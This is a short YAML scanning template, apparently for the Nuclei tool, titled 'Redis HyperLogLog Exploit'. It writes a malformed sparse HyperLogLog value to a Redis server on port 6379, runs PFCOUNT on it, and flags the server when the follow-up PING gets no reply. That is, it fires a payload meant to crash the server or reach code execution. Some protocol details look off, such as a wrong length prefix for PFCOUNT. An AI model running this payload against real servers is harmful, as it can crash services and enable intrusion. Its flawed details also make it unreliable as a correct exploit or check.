id: redis-hll-exploit

info:
  name: Redis HyperLogLog Exploit
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template checks for vulnerabilities in Redis HyperLogLog implementation. It can exploit malformed sparse HyperLogLog data to trigger crashes, unexpected behaviors, or remote code execution.
  tags: redis,hll,exploit,rce

variables:
  payload: "{{hex_decode('484C4C01000000000000000000000000000000007FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF')}}"

tcp:
  - host:
      - "{{Hostname}}"
    port: 6379
    inputs:
      - data: |
          *3\r\n$3\r\nSET\r\n$7\r\nhll:exp\r\n${{len(payload)}}\r\n{{payload}}\r\n
          *3\r\n$7\r\nPFCOUNT\r\n$7\r\nhll:exp\r\n$7\r\nhll:exp\r\n
          *1\r\n$4\r\nPING\r\n
    read-size: 1024
    matchers-condition: or
    matchers:
      - type: regex
        regex:
          - "ERR (.*)invalid (.*)HLL(.*)"
          - "WRONGTYPE|PROTOCOL|OOM"
        part: data
      - type: word
        words:
          - "+PONG"
        negative: true
      - type: status
        status:
          - -1
